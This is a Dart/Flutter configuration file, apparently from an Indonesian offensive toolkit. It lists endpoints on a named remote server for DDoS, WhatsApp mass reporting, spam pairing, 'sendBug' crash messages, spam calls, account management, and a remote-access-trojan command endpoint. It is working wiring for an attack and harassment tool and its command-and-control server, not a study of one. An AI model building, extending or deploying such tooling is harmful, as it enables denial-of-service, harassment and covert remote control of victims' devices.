// ============================================================================
// API CONFIGURATION
// ============================================================================
//
// OSINT dan Phone Lookup sudah berfungsi FULL LOKAL (tanpa server).
// 
// Tools lain (DDoS, WA Report, Spam Pair) masih perlu server.
// Gunakan standalone server di folder `tools/` untuk alternatif ringan:
//   - osint_server.js  → port 3003 (TIDAK DIGUNAKAN - SUDAH LOKAL)
//   - phone_lookup_server.js → port 3004 (TIDAK DIGUNAKAN - SUDAH LOKAL)
//   - spam_pair_server.js → port 3005
//
// ============================================================================

import 'package:flutter/foundation.dart';

class ApiConfig {
  static const String _serverHost = 'fantzy.jserver.web.id';

  static String get _host => _serverHost;

  // Main API server (WA bot + auth + RAT) — port 2007
  static String get baseUrl => 'http://$_serverHost:2007';

  // RAT alias (sama dengan baseUrl, semua endpoint di port 2007)
  static String get ratUrl => 'http://$_serverHost:2007';

  // Local tool servers (port 3003-3005)
  static String get localOsintUrl => 'http://$_serverHost:3003';
  static String get localPhoneLookupUrl => 'http://$_serverHost:3004';
  static String get localSpamPairUrl => 'http://$_serverHost:3005';

  static const int connectionTimeout = 30;
  static const int receiveTimeout = 30;

  // Auth endpoints → port 2007
  static String get validateEndpoint => '$baseUrl/validate';
  static String get myInfoEndpoint => '$baseUrl/myInfo';
  static String get changePassEndpoint => '$baseUrl/changepass';
  static String get createAccountEndpoint => '$baseUrl/createAccount';
  static String get deleteUserEndpoint => '$baseUrl/deleteUser';
  static String get listUsersEndpoint => '$baseUrl/listUsers';

  // WA bug/sender/chat endpoints → port 2007
  static String get sendBugEndpoint => '$baseUrl/sendBug';
  static String get getPairingEndpoint => '$baseUrl/getPairing';
  static String get mySenderEndpoint => '$baseUrl/mySender';
  static String get globalSendersEndpoint => '$baseUrl/globalSenders';
  static String get addGlobalSenderEndpoint => '$baseUrl/addGlobalSender';
  static String get confirmGlobalSenderEndpoint => '$baseUrl/confirmGlobalSender';
  static String get deleteGlobalSenderEndpoint => '$baseUrl/deleteGlobalSender';
  static String get spamCallEndpoint => '$baseUrl/spamCall';
  static String get addServerEndpoint => '$baseUrl/addServer';
  static String get delServerEndpoint => '$baseUrl/delServer';
  static String get myServerEndpoint => '$baseUrl/myServer';
  static String get getInfoEndpoint => '$baseUrl/getInfo';
  static String get getOnlineUsersEndpoint => '$baseUrl/getOnlineUsers';

  // RAT endpoints → port 2008
  static String get sendCommandEndpoint => '$ratUrl/api/send-command';

  // WebSocket URL → port 2007
  static String get wsUrl => 'http://$_host:2007';

  // Chat Global Endpoints → port 2007
  static String get getChatMessagesEndpoint => '$baseUrl/getChatMessages';
  static String get sendChatMessageEndpoint => '$baseUrl/sendChatMessage';
  static String get uploadChatMediaEndpoint => '$baseUrl/uploadChatMedia';
  static String get getChatRoomsEndpoint => '$baseUrl/getChatRooms';
  static String get getChatUsersEndpoint => '$baseUrl/getChatUsers';
}
